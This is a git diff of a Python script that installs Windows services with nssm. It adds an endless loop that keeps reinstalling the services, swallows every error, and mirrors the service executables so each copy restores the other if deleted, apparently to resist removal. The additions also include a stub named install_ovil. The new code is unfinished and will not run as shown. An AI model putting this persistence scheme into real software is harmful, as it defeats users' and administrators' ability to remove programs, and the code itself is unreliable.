@@ -1,4 +1,6 @@
+import pathlib
 import os
+import shutil
 from functools import reduce
 from typing import Tuple, List
 # import win32serviceutil
@@ -7,20 +9,39 @@ from typing import Tuple, List
 # import servicemanager
 # import socket
 import subprocess
+import pathlib
 # import time
 # import sys
 # from SMWinservice import SMWinservice
 # import random
 import time
-from consts import ROOT_DIRECTORY
+from consts import *
 
-live = True
-num = 2
+# live = True
+# num = 2
 
 
 def install_ovil():
     # TODO: finnish this
     pass
+
+
+def secure_files(protected_files: List[Tuple[str, str]] = SERVICE_PATHS, protected_dirs: List[Tuple[str, str]] = PROTECTED_DIRS) -> None:
+    for service in protected_files:
+        p1 = pathlib.Path(service[0])
+        p1.parent.mkdir(parents=True, exist_ok=True)
+        p2 = pathlib.Path(service[1])
+        p2.parent.mkdir(parents=True, exist_ok=True)
+        if not p1.exists():
+            shutil.copyfile(p2, p1)
+        if not p2.exists():
+            shutil.copyfile(p1, p2)
+
+    for d in protected_dirs:
+        og_dir = pathlib.Path(d[0])
+        alt_dir = pathlib.Path(d[0])
+        for file in og_dir:
+            # TODO: finnish going through dirs
 
 
 def run(command: str) -> Tuple[str, str]:
@@ -29,12 +50,16 @@ def run(command: str) -> Tuple[str, str]:
 
 
 def infinite_service(service_name: str) -> None:
-    install_service(service_name, f"{ROOT_DIRECTORY}\\{service_name}.exe", f"{ROOT_DIRECTORY}\\{'nssm.exe'}",
+    install_service(service_name, f"{SERVICE_PATH}\\{service_name}.exe", f"{ROOT_DIRECTORY}\\{'nssm.exe'}",
                     override=False)
     while True:
-        # time.sleep(1)
-        install_ovil()
-        install_service(service_name, f"{ROOT_DIRECTORY}\\{service_name}.exe", f"{ROOT_DIRECTORY}\\{'nssm.exe'}")
+        try:
+            # time.sleep(1)
+            secure_files()
+            install_ovil()
+            install_service(service_name, f"{SERVICE_PATH}\\{service_name}.exe", f"{ROOT_DIRECTORY}\\{'nssm.exe'}")
+        except:
+            pass
 
 
 def check_status(service_name: str, nssm_path: str = "nssm.exe") -> Tuple[str, str]:
@@ -118,6 +143,10 @@ def remove_services(services: List[str], nssm_path: str) -> None:
 
 
 if __name__ == "__main__":
-    remove_services(["service1", "service2"], f"{ROOT_DIRECTORY}\\{'nssm.exe'}")
-    install_service("service1", f"{ROOT_DIRECTORY}\\service1.exe", f"{ROOT_DIRECTORY}\\{'nssm.exe'}", override=True)
-    install_service("service2", f"{ROOT_DIRECTORY}\\service2.exe", f"{ROOT_DIRECTORY}\\{'nssm.exe'}", override=True)
+    while True:
+        secure_files()
+    # remove_services([f"{SERVICE_NAME}1", f"{SERVICE_NAME}2"], f"{ROOT_DIRECTORY}\\{'nssm.exe'}")
+    # install_service(f"{SERVICE_NAME}1", SERVICE_PATHS[0][0], f"{ROOT_DIRECTORY}\\{'nssm.exe'}",
+    #                 override=True)
+    # install_service(f"{SERVICE_NAME}2", SERVICE_PATHS[1][0], f"{ROOT_DIRECTORY}\\{'nssm.exe'}",
+    #                 override=True)
